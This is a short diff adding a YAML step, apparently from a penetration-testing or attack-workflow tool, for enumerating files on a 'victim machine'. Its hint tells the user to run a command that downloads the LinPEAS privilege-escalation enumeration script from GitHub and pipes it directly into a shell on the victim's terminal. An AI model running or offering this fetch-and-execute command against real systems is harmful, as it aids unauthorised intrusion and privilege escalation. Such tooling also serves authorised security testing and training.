@@ -1,0 +1,9 @@
+description: search for interesting file or entries in victim machine
+function: magic_function
+argument: []
+In: []
+condition: 
+Out: []
+hint: 
+  - "In victim's terminal, enter `curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh`"
+  - "Do you find anything interesting?(y/N)"
